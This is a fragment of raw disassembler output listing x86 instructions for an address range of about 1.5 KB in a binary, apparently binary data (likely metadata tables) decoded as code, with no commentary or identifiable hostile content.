  4069ca:	5f                   	pop    %edi
  4069cb:	02 5c 00 6f          	add    0x6f(%eax,%eax,1),%bl
  4069cf:	25 00 00 00 00       	and    $0x0,%eax
  4069d4:	e1 01                	loope  0x4069d7
  4069d6:	e2 1d                	loop   0x4069f5
  4069d8:	64 02 5c 00 7c       	add    %fs:0x7c(%eax,%eax,1),%bl
  4069dd:	25 00 00 00 00       	and    $0x0,%eax
  4069e2:	86 18                	xchg   %bl,(%eax)
  4069e4:	19 1e                	sbb    %ebx,(%esi)
  4069e6:	0e                   	push   %cs
  4069e7:	00 5c 00 20          	add    %bl,0x20(%eax,%eax,1)
  4069eb:	55                   	push   %ebp
  4069ec:	00 00                	add    %al,(%eax)
  4069ee:	00 00                	add    %al,(%eax)
  4069f0:	96                   	xchg   %eax,%esi
  4069f1:	00 93 14 b1 02 5c    	add    %dl,0x5c02b114(%ebx)
  4069f7:	00 8f 25 00 00 00    	add    %cl,0x25(%edi)
  4069fd:	00 96 00 b7 02 b8    	add    %dl,-0x47fd4900(%esi)
  406a03:	02 5e 00             	add    0x0(%esi),%bl
  406a06:	44                   	inc    %esp
  406a07:	55                   	push   %ebp
  406a08:	00 00                	add    %al,(%eax)
  406a0a:	00 00                	add    %al,(%eax)
  406a0c:	96                   	xchg   %eax,%esi
  406a0d:	00 09                	add    %cl,(%ecx)
  406a0f:	08 be 02 5f 00 78    	or     %bh,0x78005f02(%esi)
  406a15:	20 00                	and    %al,(%eax)
  406a17:	00 00                	add    %al,(%eax)
  406a19:	00 86 18 19 1e 0e    	add    %al,0xe1e1918(%esi)
  406a1f:	00 61 00             	add    %ah,0x0(%ecx)
  406a22:	9e                   	sahf
  406a23:	25 00 00 00 00       	and    $0x0,%eax
  406a28:	96                   	xchg   %eax,%esi
  406a29:	00 7e 02             	add    %bh,0x2(%esi)
  406a2c:	c5 02                	lds    (%edx),%eax
  406a2e:	61                   	popa
  406a2f:	00 04 56             	add    %al,(%esi,%edx,2)
  406a32:	00 00                	add    %al,(%eax)
  406a34:	00 00                	add    %al,(%eax)
  406a36:	96                   	xchg   %eax,%esi
  406a37:	00 81 07 cb 02 62    	add    %al,0x6202cb07(%ecx)
  406a3d:	00 cc                	add    %cl,%ah
  406a3f:	56                   	push   %esi
  406a40:	00 00                	add    %al,(%eax)
  406a42:	00 00                	add    %al,(%eax)
  406a44:	96                   	xchg   %eax,%esi
  406a45:	00 d0                	add    %dl,%al
  406a47:	17                   	pop    %ss
  406a48:	d2 02                	rolb   %cl,(%edx)
  406a4a:	64 00 ab 25 00 00 00 	add    %ch,%fs:0x25(%ebx)
  406a51:	00 96 00 92 26 da    	add    %dl,-0x25d96e00(%esi)
  406a57:	02 66 00             	add    0x0(%esi),%ah
  406a5a:	c6                   	(bad)
  406a5b:	25 00 00 00 00       	and    $0x0,%eax
  406a60:	96                   	xchg   %eax,%esi
  406a61:	00 80 12 e1 02 68    	add    %al,0x6802e112(%eax)
  406a67:	00 e6                	add    %ah,%dh
  406a69:	25 00 00 00 00       	and    $0x0,%eax
  406a6e:	96                   	xchg   %eax,%esi
  406a6f:	00 67 24             	add    %ah,0x24(%edi)
  406a72:	e8 02 6a 00 6c       	call   0x6c40d479
  406a77:	57                   	push   %edi
  406a78:	00 00                	add    %al,(%eax)
  406a7a:	00 00                	add    %al,(%eax)
  406a7c:	96                   	xchg   %eax,%esi
  406a7d:	00 5c 0a ef          	add    %bl,-0x11(%edx,%ecx,1)
  406a81:	02 6c 00 9c          	add    -0x64(%eax,%eax,1),%ch
  406a85:	57                   	push   %edi
  406a86:	00 00                	add    %al,(%eax)
  406a88:	00 00                	add    %al,(%eax)
  406a8a:	96                   	xchg   %eax,%esi
  406a8b:	00 76 23             	add    %dh,0x23(%esi)
  406a8e:	f6 02 6e             	testb  $0x6e,(%edx)
  406a91:	00 78 20             	add    %bh,0x20(%eax)
  406a94:	00 00                	add    %al,(%eax)
  406a96:	00 00                	add    %al,(%eax)
  406a98:	86 18                	xchg   %bl,(%eax)
  406a9a:	19 1e                	sbb    %ebx,(%esi)
  406a9c:	0e                   	push   %cs
  406a9d:	00 70 00             	add    %dh,0x0(%eax)
  406aa0:	e0 58                	loopne 0x406afa
  406aa2:	00 00                	add    %al,(%eax)
  406aa4:	00 00                	add    %al,(%eax)
  406aa6:	96                   	xchg   %eax,%esi
  406aa7:	00 b5 1a 84 01 70    	add    %dh,0x7001841a(%ebp)
  406aad:	00 6c 59 00          	add    %ch,0x0(%ecx,%ebx,2)
  406ab1:	00 00                	add    %al,(%eax)
  406ab3:	00 96 00 58 24 84    	add    %dl,-0x7bdba800(%esi)
  406ab9:	01 71 00             	add    %esi,0x0(%ecx)
  406abc:	00 00                	add    %al,(%eax)
  406abe:	01 00                	add    %eax,(%eax)
  406ac0:	4d                   	dec    %ebp
  406ac1:	19 00                	sbb    %eax,(%eax)
  406ac3:	00 01                	add    %al,(%ecx)
  406ac5:	00 22                	add    %ah,(%edx)
  406ac7:	02 00                	add    (%eax),%al
  406ac9:	00 01                	add    %al,(%ecx)
  406acb:	00 92 09 00 00 01    	add    %dl,0x1000009(%edx)
  406ad1:	00 c7                	add    %al,%bh
  406ad3:	07                   	pop    %es
  406ad4:	00 00                	add    %al,(%eax)
  406ad6:	01 00                	add    %eax,(%eax)
  406ad8:	0b 0a                	or     (%edx),%ecx
  406ada:	00 00                	add    %al,(%eax)
  406adc:	01 00                	add    %eax,(%eax)
  406ade:	d9 01                	flds   (%ecx)
  406ae0:	00 00                	add    %al,(%eax)
  406ae2:	01 00                	add    %eax,(%eax)
  406ae4:	9b                   	fwait
  406ae5:	02 00                	add    (%eax),%al
  406ae7:	00 01                	add    %al,(%ecx)
  406ae9:	00 72 12             	add    %dh,0x12(%edx)
  406aec:	00 00                	add    %al,(%eax)
  406aee:	01 00                	add    %eax,(%eax)
  406af0:	d7                   	xlat   %ds:(%ebx)
  406af1:	1b 00                	sbb    (%eax),%eax
  406af3:	00 01                	add    %al,(%ecx)
  406af5:	00 0b                	add    %cl,(%ebx)
  406af7:	06                   	push   %es
  406af8:	00 00                	add    %al,(%eax)
  406afa:	01 00                	add    %eax,(%eax)
  406afc:	88 05 00 00 01 00    	mov    %al,0x10000
  406b02:	bd 23 00 00 02       	mov    $0x2000023,%ebp
  406b07:	00 54 25 00          	add    %dl,0x0(%ebp,%eiz,1)
  406b0b:	00 03                	add    %al,(%ebx)
  406b0d:	00 14 19             	add    %dl,(%ecx,%ebx,1)
  406b10:	00 00                	add    %al,(%eax)
  406b12:	04 00                	add    $0x0,%al
  406b14:	76 04                	jbe    0x406b1a
  406b16:	00 00                	add    %al,(%eax)
  406b18:	01 00                	add    %eax,(%eax)
  406b1a:	04 01                	add    $0x1,%al
  406b1c:	00 00                	add    %al,(%eax)
  406b1e:	01 00                	add    %eax,(%eax)
  406b20:	aa                   	stos   %al,%es:(%edi)
  406b21:	02 00                	add    (%eax),%al
  406b23:	00 01                	add    %al,(%ecx)
  406b25:	00 1e                	add    %bl,(%esi)
  406b27:	0f 00 00             	sldt   (%eax)
  406b2a:	01 00                	add    %eax,(%eax)
  406b2c:	b1 14                	mov    $0x14,%cl
  406b2e:	00 00                	add    %al,(%eax)
  406b30:	01 00                	add    %eax,(%eax)
  406b32:	f7 17                	notl   (%edi)
  406b34:	00 00                	add    %al,(%eax)
  406b36:	01 00                	add    %eax,(%eax)
  406b38:	46                   	inc    %esi
  406b39:	26 00 00             	add    %al,%es:(%eax)
  406b3c:	01 00                	add    %eax,(%eax)
  406b3e:	bf 00 00 00 02       	mov    $0x2000000,%edi
  406b43:	00 8e 15 00 00 03    	add    %cl,0x3000015(%esi)
  406b49:	00 e2                	add    %ah,%dl
  406b4b:	24 00                	and    $0x0,%al
  406b4d:	00 01                	add    %al,(%ecx)
  406b4f:	00 91 07 00 00 01    	add    %dl,0x1000007(%ecx)
  406b55:	00 64 01 00          	add    %ah,0x0(%ecx,%eax,1)
  406b59:	00 02                	add    %al,(%edx)
  406b5b:	00 b2 05 00 00 01    	add    %dh,0x1000005(%edx)
  406b61:	00 ab 1b 00 00 01    	add    %ch,0x100001b(%ebx)
  406b67:	00 eb                	add    %ch,%bl
  406b69:	02 00                	add    (%eax),%al
  406b6b:	00 02                	add    %al,(%edx)
  406b6d:	00 3e                	add    %bh,(%esi)
  406b6f:	04 00                	add    $0x0,%al
  406b71:	00 03                	add    %al,(%ebx)
  406b73:	00 60 25             	add    %ah,0x25(%eax)
  406b76:	00 00                	add    %al,(%eax)
  406b78:	01 00                	add    %eax,(%eax)
  406b7a:	84 26                	test   %ah,(%esi)
  406b7c:	00 00                	add    %al,(%eax)
  406b7e:	02 00                	add    (%eax),%al
  406b80:	b5 17                	mov    $0x17,%ch
  406b82:	00 00                	add    %al,(%eax)
  406b84:	01 00                	add    %eax,(%eax)
  406b86:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  406b87:	1a 00                	sbb    (%eax),%al
  406b89:	00 02                	add    %al,(%edx)
  406b8b:	00 13                	add    %dl,(%ebx)
  406b8d:	03 00                	add    (%eax),%eax
  406b8f:	00 01                	add    %al,(%ecx)
  406b91:	00 06                	add    %al,(%esi)
  406b93:	21 00                	and    %eax,(%eax)
  406b95:	00 01                	add    %al,(%ecx)
  406b97:	00 f5                	add    %dh,%ch
  406b99:	15 00 00 01 00       	adc    $0x10000,%eax
  406b9e:	48                   	dec    %eax
  406b9f:	25 00 00 01 00       	and    $0x10000,%eax
  406ba4:	46                   	inc    %esi
  406ba5:	01 00                	add    %eax,(%eax)
  406ba7:	00 01                	add    %al,(%ecx)
  406ba9:	00 4e 18             	add    %cl,0x18(%esi)
  406bac:	00 00                	add    %al,(%eax)
  406bae:	01 00                	add    %eax,(%eax)
  406bb0:	a0 14 00 00 01       	mov    0x1000014,%al
  406bb5:	00 83 23 00 00 01    	add    %al,0x1000023(%ebx)
  406bbb:	00 8d 02 00 00 01    	add    %cl,0x1000002(%ebp)
  406bc1:	00 15 13 00 00 01    	add    %dl,0x1000013
  406bc7:	00 4b 24             	add    %cl,0x24(%ebx)
  406bca:	00 00                	add    %al,(%eax)
  406bcc:	01 00                	add    %eax,(%eax)
  406bce:	75 09                	jne    0x406bd9
  406bd0:	00 00                	add    %al,(%eax)
  406bd2:	02 00                	add    (%eax),%al
  406bd4:	63 15 00 00 01 00    	arpl   %edx,0x10000
  406bda:	6a 14                	push   $0x14
  406bdc:	00 00                	add    %al,(%eax)
  406bde:	01 00                	add    %eax,(%eax)
  406be0:	cf                   	iret
  406be1:	15 00 00 01 00       	adc    $0x10000,%eax
  406be6:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406be7:	03 00                	add    (%eax),%eax
  406be9:	00 01                	add    %al,(%ecx)
  406beb:	00 c6                	add    %al,%dh
  406bed:	04 00                	add    $0x0,%al
  406bef:	00 01                	add    %al,(%ecx)
  406bf1:	00 8c 0f 00 00 01 00 	add    %cl,0x10000(%edi,%ecx,1)
  406bf8:	84 14 00             	test   %dl,(%eax,%eax,1)
  406bfb:	00 01                	add    %al,(%ecx)
  406bfd:	00 05 23 00 00 01    	add    %al,0x1000023
  406c03:	00 17                	add    %dl,(%edi)
  406c05:	08 00                	or     %al,(%eax)
  406c07:	00 01                	add    %al,(%ecx)
  406c09:	00 6b 25             	add    %ch,0x25(%ebx)
  406c0c:	00 00                	add    %al,(%eax)
  406c0e:	01 00                	add    %eax,(%eax)
  406c10:	8f                   	(bad)
  406c11:	24 00                	and    $0x0,%al
  406c13:	00 01                	add    %al,(%ecx)
  406c15:	00 0f                	add    %cl,(%edi)
  406c17:	07                   	pop    %es
  406c18:	00 00                	add    %al,(%eax)
  406c1a:	01 00                	add    %eax,(%eax)
  406c1c:	ab                   	stos   %eax,%es:(%edi)
  406c1d:	12 00                	adc    (%eax),%al
  406c1f:	00 01                	add    %al,(%ecx)
  406c21:	00 a7 15 00 00 02    	add    %ah,0x2000015(%edi)
  406c27:	00 72 03             	add    %dh,0x3(%edx)
  406c2a:	00 00                	add    %al,(%eax)
  406c2c:	01 00                	add    %eax,(%eax)
  406c2e:	c2 17 00             	ret    $0x17
  406c31:	00 01                	add    %al,(%ecx)
  406c33:	00 cb                	add    %cl,%bl
  406c35:	0a 00                	or     (%eax),%al
  406c37:	00 01                	add    %al,(%ecx)
  406c39:	00 7b 15             	add    %bh,0x15(%ebx)
  406c3c:	00 00                	add    %al,(%eax)
  406c3e:	01 00                	add    %eax,(%eax)
  406c40:	4f                   	dec    %edi
  406c41:	1b 00                	sbb    (%eax),%eax
  406c43:	00 01                	add    %al,(%ecx)
  406c45:	00 24 08             	add    %ah,(%eax,%ecx,1)
  406c48:	00 00                	add    %al,(%eax)
  406c4a:	01 00                	add    %eax,(%eax)
  406c4c:	de 00                	fiadds (%eax)
  406c4e:	00 00                	add    %al,(%eax)
  406c50:	01 00                	add    %eax,(%eax)
  406c52:	54                   	push   %esp
  406c53:	15 00 00 01 00       	adc    $0x10000,%eax
  406c58:	df 07                	filds  (%edi)
  406c5a:	00 00                	add    %al,(%eax)
  406c5c:	01 00                	add    %eax,(%eax)
  406c5e:	b3 00                	mov    $0x0,%bl
  406c60:	00 00                	add    %al,(%eax)
  406c62:	01 00                	add    %eax,(%eax)
  406c64:	27                   	daa
  406c65:	07                   	pop    %es
  406c66:	00 00                	add    %al,(%eax)
  406c68:	01 00                	add    %eax,(%eax)
  406c6a:	59                   	pop    %ecx
  406c6b:	09 00                	or     %eax,(%eax)
  406c6d:	00 01                	add    %al,(%ecx)
  406c6f:	00 a0 23 00 00 01    	add    %ah,0x1000023(%eax)
  406c75:	00 1f                	add    %bl,(%edi)
  406c77:	04 00                	add    $0x0,%al
  406c79:	00 02                	add    %al,(%edx)
  406c7b:	00 40 24             	add    %al,0x24(%eax)
  406c7e:	00 00                	add    %al,(%eax)
  406c80:	01 00                	add    %eax,(%eax)
  406c82:	75 24                	jne    0x406ca8
  406c84:	00 00                	add    %al,(%eax)
  406c86:	02 00                	add    (%eax),%al
  406c88:	4e                   	dec    %esi
  406c89:	08 00                	or     %al,(%eax)
  406c8b:	00 01                	add    %al,(%ecx)
  406c8d:	00 97 05 00 00 01    	add    %dl,0x1000005(%edi)
  406c93:	00 75 14             	add    %dh,0x14(%ebp)
  406c96:	00 00                	add    %al,(%eax)
  406c98:	01 00                	add    %eax,(%eax)
  406c9a:	c3                   	ret
  406c9b:	15 00 00 01 00       	adc    $0x10000,%eax
  406ca0:	f4                   	hlt
  406ca1:	18 00                	sbb    %al,(%eax)
  406ca3:	00 01                	add    %al,(%ecx)
  406ca5:	00 7d 08             	add    %bh,0x8(%ebp)
  406ca8:	00 00                	add    %al,(%eax)
  406caa:	01 00                	add    %eax,(%eax)
  406cac:	e5 08                	in     $0x8,%eax
  406cae:	00 00                	add    %al,(%eax)
  406cb0:	01 00                	add    %eax,(%eax)
  406cb2:	e2 04                	loop   0x406cb8
  406cb4:	00 00                	add    %al,(%eax)
  406cb6:	01 00                	add    %eax,(%eax)
  406cb8:	3a 15 00 00 01 00    	cmp    0x10000,%dl
  406cbe:	a2 16 00 00 01       	mov    %al,0x1000016
  406cc3:	00 fa                	add    %bh,%dl
  406cc5:	12 00                	adc    (%eax),%al
  406cc7:	00 01                	add    %al,(%ecx)
  406cc9:	00 55 1e             	add    %dl,0x1e(%ebp)
  406ccc:	00 00                	add    %al,(%eax)
  406cce:	01 00                	add    %eax,(%eax)
  406cd0:	5f                   	pop    %edi
  406cd1:	1b 00                	sbb    (%eax),%eax
  406cd3:	00 01                	add    %al,(%ecx)
  406cd5:	00 bd 1b 00 00 01    	add    %bh,0x100001b(%ebp)
  406cdb:	00 39                	add    %bh,(%ecx)
  406cdd:	01 00                	add    %eax,(%eax)
  406cdf:	00 01                	add    %al,(%ecx)
  406ce1:	00 69 04             	add    %ch,0x4(%ecx)
  406ce4:	00 00                	add    %al,(%eax)
  406ce6:	02 00                	add    (%eax),%al
  406ce8:	f5                   	cmc
  406ce9:	08 00                	or     %al,(%eax)
  406ceb:	00 01                	add    %al,(%ecx)
  406ced:	00 63 1e             	add    %ah,0x1e(%ebx)
  406cf0:	00 00                	add    %al,(%eax)
  406cf2:	01 00                	add    %eax,(%eax)
  406cf4:	34 06                	xor    $0x6,%al
  406cf6:	00 00                	add    %al,(%eax)
  406cf8:	02 00                	add    (%eax),%al
  406cfa:	5d                   	pop    %ebp
  406cfb:	18 00                	sbb    %al,(%eax)
  406cfd:	00 01                	add    %al,(%ecx)
  406cff:	00 ea                	add    %ch,%dl
  406d01:	03 00                	add    (%eax),%eax
  406d03:	00 01                	add    %al,(%ecx)
  406d05:	00 97 03 00 00 02    	add    %dl,0x2000003(%edi)
  406d0b:	00 de                	add    %bl,%dh
  406d0d:	12 00                	adc    (%eax),%al
  406d0f:	00 01                	add    %al,(%ecx)
  406d11:	00 f5                	add    %dh,%ch
  406d13:	23 00                	and    (%eax),%eax
  406d15:	00 02                	add    %al,(%edx)
  406d17:	00 4a 04             	add    %cl,0x4(%edx)
  406d1a:	00 00                	add    %al,(%eax)
  406d1c:	01 00                	add    %eax,(%eax)
  406d1e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406d1f:	00 00                	add    %al,(%eax)
  406d21:	00 02                	add    %al,(%edx)
  406d23:	00 3c 05 00 00 01 00 	add    %bh,0x10000(,%eax,1)
  406d2a:	35 08 00 00 02       	xor    $0x2000008,%eax
  406d2f:	00 82 01 00 00 01    	add    %al,0x1000001(%edx)
  406d35:	00 3e                	add    %bh,(%esi)
  406d37:	0a 00                	or     (%eax),%al
  406d39:	00 02                	add    %al,(%edx)
  406d3b:	00 84 24 00 00 01 00 	add    %al,0x10000(%esp)
  406d42:	8a 06                	mov    (%esi),%al
  406d44:	00 00                	add    %al,(%eax)
  406d46:	02 00                	add    (%eax),%al
  406d48:	9d                   	popf
  406d49:	09 00                	or     %eax,(%eax)
  406d4b:	00 01                	add    %al,(%ecx)
  406d4d:	00 e6                	add    %ah,%dh
  406d4f:	16                   	push   %ss
  406d50:	00 00                	add    %al,(%eax)
  406d52:	02 00                	add    (%eax),%al
  406d54:	3f                   	aas
  406d55:	09 00                	or     %eax,(%eax)
  406d57:	00 01                	add    %al,(%ecx)
  406d59:	00 00                	add    %al,(%eax)
  406d5b:	1c 00                	sbb    $0x0,%al
  406d5d:	00 01                	add    %al,(%ecx)
  406d5f:	00 ea                	add    %ch,%dl
  406d61:	26 16                	es push %ss
  406d63:	00 59 00             	add    %bl,0x0(%ecx)
  406d66:	18 00                	sbb    %al,(%eax)
  406d68:	5d                   	pop    %ebp
  406d69:	00 b1 00 76 22 bb    	add    %dh,-0x44dd8a00(%ecx)
  406d6f:	01 b1 00 43 23 bf    	add    %esi,-0x40dcbd00(%ecx)
  406d75:	01 b1 00 9d 21 0e    	add    %esi,0xe219d00(%ecx)
  406d7b:	00 b9 00 01 1e 64    	add    %bh,0x641e0100(%ecx)
  406d81:	02 c9                	add    %cl,%cl
  406d83:	00 19                	add    %bl,(%ecx)
  406d85:	1e                   	push   %ds
  406d86:	01 03                	add    %eax,(%ebx)
  406d88:	d1 00                	roll   $1,(%eax)
  406d8a:	19 1e                	sbb    %ebx,(%esi)
  406d8c:	0e                   	push   %cs
  406d8d:	00 d9                	add    %bl,%cl
  406d8f:	00 19                	add    %bl,(%ecx)
  406d91:	1e                   	push   %ds
  406d92:	2e 03 e9             	cs add %ecx,%ebp
  406d95:	00 19                	add    %bl,(%ecx)
  406d97:	1e                   	push   %ds
  406d98:	6b 01 f1             	imul   $0xfffffff1,(%ecx),%eax
  406d9b:	00 19                	add    %bl,(%ecx)
  406d9d:	1e                   	push   %ds
  406d9e:	6b 01 f9             	imul   $0xfffffff9,(%ecx),%eax
  406da1:	00 19                	add    %bl,(%ecx)
  406da3:	1e                   	push   %ds
  406da4:	6b 01 01             	imul   $0x1,(%ecx),%eax
  406da7:	01 19                	add    %ebx,(%ecx)
  406da9:	1e                   	push   %ds
  406daa:	6b 01 09             	imul   $0x9,(%ecx),%eax
  406dad:	01 19                	add    %ebx,(%ecx)
  406daf:	1e                   	push   %ds
  406db0:	6b 01 11             	imul   $0x11,(%ecx),%eax
  406db3:	01 19                	add    %ebx,(%ecx)
  406db5:	1e                   	push   %ds
  406db6:	6b 01 19             	imul   $0x19,(%ecx),%eax
  406db9:	01 19                	add    %ebx,(%ecx)
  406dbb:	1e                   	push   %ds
  406dbc:	6b 01 21             	imul   $0x21,(%ecx),%eax
  406dbf:	01 19                	add    %ebx,(%ecx)
  406dc1:	1e                   	push   %ds
  406dc2:	6b 01 29             	imul   $0x29,(%ecx),%eax
  406dc5:	01 19                	add    %ebx,(%ecx)
  406dc7:	1e                   	push   %ds
  406dc8:	6b 01 31             	imul   $0x31,(%ecx),%eax
  406dcb:	01 19                	add    %ebx,(%ecx)
  406dcd:	1e                   	push   %ds
  406dce:	4b                   	dec    %ebx
  406dcf:	02 39                	add    (%ecx),%bh
  406dd1:	01 19                	add    %ebx,(%ecx)
  406dd3:	1e                   	push   %ds
  406dd4:	0e                   	push   %cs
  406dd5:	00 41 01             	add    %al,0x1(%ecx)
  406dd8:	19 1e                	sbb    %ebx,(%esi)
  406dda:	6b 01 49             	imul   $0x49,(%ecx),%eax
  406ddd:	01 6e 1b             	add    %ebp,0x1b(%esi)
  406de0:	7f 00                	jg     0x406de2
  406de2:	51                   	push   %ecx
  406de3:	01 44 00 c4          	add    %eax,-0x3c(%eax,%eax,1)
  406de7:	03 59 01             	add    0x1(%ecx),%ebx
  406dea:	bf 21 7f 00 51       	mov    $0x51007f21,%edi
  406def:	01 43 19             	add    %eax,0x19(%ebx)
  406df2:	84 00                	test   %al,(%eax)
  406df4:	09 00                	or     %eax,(%eax)
  406df6:	19 1e                	sbb    %ebx,(%esi)
  406df8:	0e                   	push   %cs
  406df9:	00 61 01             	add    %ah,0x1(%ecx)
  406dfc:	92                   	xchg   %eax,%edx
  406dfd:	00 cd                	add    %cl,%ch
  406dff:	03 51 01             	add    0x1(%ecx),%edx
  406e02:	c3                   	ret
  406e03:	13 2a                	adc    (%edx),%ebp
  406e05:	01 61 01             	add    %esp,0x1(%ecx)
  406e08:	15 14 d3 03 11       	adc    $0x1103d314,%eax
  406e0d:	00 19                	add    %bl,(%ecx)
  406e0f:	1e                   	push   %ds
  406e10:	2b 02                	sub    (%edx),%eax
  406e12:	11 00                	adc    %eax,(%eax)
  406e14:	ea 25 d9 03 69 01 c2 	ljmp   $0xc201,$0x6903d925
  406e1b:	25 df 03 61 01       	and    $0x16103df,%eax
  406e20:	77 1f                	ja     0x406e41
  406e22:	e5 03                	in     $0x3,%eax
  406e24:	81 01 9c 01 c7 00    	addl   $0xc7019c,(%ecx)
  406e2a:	79 01                	jns    0x406e2d
  406e2c:	e4 14                	in     $0x14,%al
  406e2e:	eb 03                	jmp    0x406e33
  406e30:	19 00                	sbb    %eax,(%eax)
  406e32:	19 1e                	sbb    %ebx,(%esi)
  406e34:	09 04 19             	or     %eax,(%ecx,%ebx,1)
  406e37:	00 50 12             	add    %dl,0x12(%eax)
  406e3a:	01 03                	add    %eax,(%ebx)
  406e3c:	19 00                	sbb    %eax,(%eax)
  406e3e:	3d 12 01 03 c1       	cmp    $0xc1030112,%eax
  406e43:	01 9e 26 16 04 c1    	add    %ebx,-0x3efbe9da(%esi)
  406e49:	01 b9 21 1c 04 d1    	add    %edi,-0x2efbe3df(%ecx)
  406e4f:	01 19                	add    %ebx,(%ecx)
  406e51:	1e                   	push   %ds
  406e52:	0e                   	push   %cs
  406e53:	00 d1                	add    %dl,%cl
  406e55:	01 47 23             	add    %eax,0x23(%edi)
  406e58:	23 04 d9             	and    (%ecx,%ebx,8),%eax
  406e5b:	01 18                	add    %ebx,(%eax)
  406e5d:	1f                   	pop    %ds
  406e5e:	28 04 19             	sub    %al,(%ecx,%ebx,1)
  406e61:	00 59 21             	add    %bl,0x21(%ecx)
  406e64:	30 04 19             	xor    %al,(%ecx,%ebx,1)
  406e67:	00 32                	add    %dh,(%edx)
  406e69:	0b bf 01 19 00 59    	or     0x59001901(%edi),%edi
  406e6f:	21 3c 02             	and    %edi,(%edx,%eax,1)
  406e72:	99                   	cltd
  406e73:	01 19                	add    %ebx,(%ecx)
  406e75:	1e                   	push   %ds
  406e76:	0e                   	push   %cs
  406e77:	00 a1 01 19 1e 36    	add    %ah,0x361e1901(%ecx)
  406e7d:	02 99 01 e5 1f 38    	add    0x381fe501(%ecx),%bl
  406e83:	04 99                	add    $0x99,%al
  406e85:	01 e3                	add    %esp,%ebx
  406e87:	13 70 01             	adc    0x1(%eax),%esi
  406e8a:	c1 01 b9             	roll   $0xb9,(%ecx)
  406e8d:	21 3f                	and    %edi,(%edi)
  406e8f:	04 d1                	add    $0xd1,%al
  406e91:	01 47 23             	add    %eax,0x23(%edi)
  406e94:	49                   	dec    %ecx
  406e95:	04 f1                	add    $0xf1,%al
  406e97:	01 9d 0f 0e 00 f9    	add    %ebx,-0x6fff1f1(%ebp)
  406e9d:	01 19                	add    %ebx,(%ecx)
  406e9f:	1e                   	push   %ds
  406ea0:	4f                   	dec    %edi
  406ea1:	04 01                	add    $0x1,%al
  406ea3:	02 19                	add    (%ecx),%bl
  406ea5:	1e                   	push   %ds
  406ea6:	56                   	push   %esi
  406ea7:	04 21                	add    $0x21,%al
  406ea9:	00 19                	add    %bl,(%ecx)
  406eab:	1e                   	push   %ds
  406eac:	5c                   	pop    %esp
  406ead:	04 19                	add    $0x19,%al
  406eaf:	00 a8 22 66 04 09    	add    %ch,0x9046622(%eax)
  406eb5:	00 f2                	add    %dh,%dl
  406eb7:	13 47 02             	adc    0x2(%edi),%eax
  406eba:	21 00                	and    %eax,(%eax)
  406ebc:	24 22                	and    $0x22,%al
  406ebe:	6c                   	insb   (%dx),%es:(%edi)
  406ebf:	04 29                	add    $0x29,%al
  406ec1:	02 19                	add    (%ecx),%bl
  406ec3:	1e                   	push   %ds
  406ec4:	56                   	push   %esi
  406ec5:	04 29                	add    $0x29,%al
  406ec7:	00 19                	add    %bl,(%ecx)
  406ec9:	1e                   	push   %ds
  406eca:	78 04                	js     0x406ed0
  406ecc:	31 02                	xor    %eax,(%edx)
  406ece:	19 1e                	sbb    %ebx,(%esi)
  406ed0:	56                   	push   %esi
  406ed1:	04 c1                	add    $0xc1,%al
  406ed3:	00 0a                	add    %cl,(%edx)
  406ed5:	0b 82 04 39 02 d3    	or     -0x2cfdc6fc(%edx),%eax
  406edb:	0e                   	push   %cs
  406edc:	8f 04 31             	pop    (%ecx,%esi,1)
  406edf:	00 f5                	add    %dh,%ch
  406ee1:	1f                   	pop    %ds
  406ee2:	96                   	xchg   %eax,%esi
  406ee3:	04 c1                	add    $0xc1,%al
  406ee5:	00 9d 0f 0e 00 19    	add    %bl,0x19000e0f(%ebp)
  406eeb:	00 9d 0f 0e 00 29    	add    %bl,0x29000e0f(%ebp)
  406ef1:	00 9d 0f 0e 00 c1    	add    %bl,-0x3efff1f1(%ebp)
  406ef7:	00 02                	add    %al,(%edx)
  406ef9:	0b a1 04 49 02 44    	or     0x44024904(%ecx),%esp
  406eff:	00 a7 04 c1 00 0f    	add    %ah,0xf00c104(%edi)
  406f05:	0b ae 04 51 02 19    	or     0x19025104(%esi),%ebp
  406f0b:	1e                   	push   %ds
  406f0c:	56                   	push   %esi
  406f0d:	04 49                	add    $0x49,%al
  406f0f:	01 19                	add    %ebx,(%ecx)
  406f11:	1e                   	push   %ds
  406f12:	b6 04                	mov    $0x4,%dh
  406f14:	49                   	dec    %ecx
  406f15:	01 f7                	add    %esi,%edi
  406f17:	22 bd 04 61 02 a0    	and    -0x5ffd9efc(%ebp),%bh
  406f1d:	1d cf 04 49 02       	sbb    $0x24904cf,%eax
  406f22:	77 1f                	ja     0x406f43
  406f24:	9f                   	lahf
  406f25:	01 19                	add    %ebx,(%ecx)
  406f27:	00 a5 17 d6 04 c1    	add    %ah,-0x3efb29e9(%ebp)
  406f2d:	00 01                	add    %al,(%ecx)
  406f2f:	10 de                	adc    %bl,%dh
  406f31:	04 59                	add    $0x59,%al
  406f33:	02 19                	add    (%ecx),%bl
  406f35:	1e                   	push   %ds
  406f36:	2b 02                	sub    (%edx),%eax
  406f38:	c1 00 4c             	roll   $0x4c,(%eax)
  406f3b:	1a 15 02 c1 00 ef    	sbb    0xef00c102,%dl
  406f41:	14 0e                	adc    $0xe,%al
  406f43:	00 61 02             	add    %ah,0x2(%ecx)
  406f46:	bf 21 9a 00 71       	mov    $0x71009a21,%edi
  406f4b:	02 51 21             	add    0x21(%ecx),%dl
  406f4e:	0a 00                	or     (%eax),%al
  406f50:	59                   	pop    %ecx
  406f51:	01 f0                	add    %esi,%eax
  406f53:	1e                   	push   %ds
  406f54:	c7 00 a1 02 16 0f    	movl   $0xf1602a1,(%eax)
  406f5a:	01 05 79 02 19 1e    	add    %eax,0x1e190279
  406f60:	6b 01 81             	imul   $0xffffff81,(%ecx),%eax
  406f63:	02 8c 20 07 05 81 02 	add    0x2810507(%eax,%eiz,1),%cl
  406f6a:	1b 0e                	sbb    (%esi),%ecx
  406f6c:	0d 05 a9 02 64       	or     $0x6402a905,%eax
  406f71:	0e                   	push   %cs
  406f72:	47                   	inc    %edi
  406f73:	02 b1 02 b9 0e 47    	add    0x470eb902(%ecx),%dh
  406f79:	02 c1                	add    %cl,%al
  406f7b:	01 aa 26 16 04 81    	add    %ebp,-0x7efbe9da(%edx)
  406f81:	02 0b                	add    (%ebx),%cl
  406f83:	1f                   	pop    %ds
  406f84:	13 05 81 02 a0 17    	adc    0x17a00281,%eax
  406f8a:	0e                   	push   %cs
  406f8b:	00 89 02 19 1e 0e    	add    %cl,0xe1e1902(%ecx)
